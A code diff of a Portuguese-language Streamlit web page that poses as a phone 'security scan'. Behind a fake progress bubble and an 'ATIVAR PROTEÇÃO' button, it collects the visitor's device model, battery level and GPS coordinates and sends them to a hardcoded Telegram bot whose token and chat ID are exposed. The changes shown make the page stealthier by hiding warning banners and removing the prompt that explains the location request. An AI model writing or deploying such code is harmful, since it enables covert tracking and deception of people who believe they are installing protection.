@@ -3,18 +3,18 @@ import requests
 import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# 1. DADOS TELEGRAM
+# 1. SETUP TELEGRAM
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
-def enviar_msg(texto):
+def enviar_telegram(msg):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    try: requests.post(url, json={"chat_id": ID, "text": texto, "parse_mode": "Markdown"})
+    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
     except: pass
 
-st.set_page_config(page_title="Segurança", layout="centered")
+st.set_page_config(page_title="Segurança Máxima", layout="centered")
 
-# 2. ANIMAÇÃO DA BOLHA (RESTAURADA)
+# 2. ANIMAÇÃO DA BOLHA (PRESERVADA)
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -31,23 +31,25 @@ st.markdown("""
     .pct-text { font-size: 45px; font-weight: bold; color: white; }
     div.stButton > button {
         background-color: #ffc107 !important; color: black !important;
-        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px;
+        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
     }
+    /* REMOVE AVISO AMARELO DO STREAMLIT */
+    .stAlert { display: none !important; }
     </style>
 """, unsafe_allow_html=True)
 
-# 3. SENSORES (MODELO E BATERIA)
-modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE')
+# 3. CAPTURA (MODELO E BATERIA)
+modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL')
 bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')
 
-# 4. INTERFACE PRINCIPAL
+# 4. INTERFACE
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
 if 'clicou' not in st.session_state:
     st.session_state['clicou'] = False
 
-# Exibe a bolha estática em 4%
+# Bolha inicial (4%)
 if not st.session_state['clicou']:
     with caixa_bolha.container():
         st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
@@ -56,7 +58,7 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 5. BOTÃO E DISPARO DO POP-UP
+# 5. BOTÃO E LÓGICA
 if st.button("🔴 ATIVAR PROTEÇÃO"):
     st.session_state['clicou'] = True
 
@@ -64,10 +66,10 @@ if st.session_state['clicou']:
     # O pop-up de localização aparece aqui
     loc = get_geolocation() 
     
-    # CORREÇÃO DA LINHA 51: Só processa se o navegador já liberou os dados
+    # Só processa se a pessoa aceitou a localização
     if loc and 'coords' in loc:
-        # Animação da porcentagem subindo
-        for p in [25, 55, 85, 100]:
+        # Animação da porcentagem subindo até 100%
+        for p in [25, 50, 80, 100]:
             caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
             time.sleep(0.1)
         
@@ -75,20 +77,19 @@ if st.session_state['clicou']:
         lon = loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
-        msg = (
+        relatorio = (
             f"🛡️ SISTEMA ATIVADO\n\n"
-            f"📱 Aparelho: {modelo[:50] if modelo else 'N/A'}\n"
+            f"📱 Celular: {modelo[:50] if modelo else 'N/A'}\n"
             f"🔋 Bateria: {bateria if bateria else '--'}%\n"
-            f"📍 [LOCALIZAÇÃO]({mapa})"
+            f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
         )
         
-        enviar_msg(msg)
-        st.success("✅ Proteção Ativada!")
+        enviar_telegram(relatorio)
+        st.success("Localização concluída") # Texto que você pediu
         st.session_state['clicou'] = False
         st.stop()
     else:
-        # Se clicou mas ainda não aceitou o pop-up, mostra o aviso e espera
-        st.warning("⚠️ Aceite a permissão de localização no pop-up acima...")
+        # Se ainda não aceitou, o script recarrega em silêncio (sem aviso amarelo)
         time.sleep(1)
         st.rerun()
 
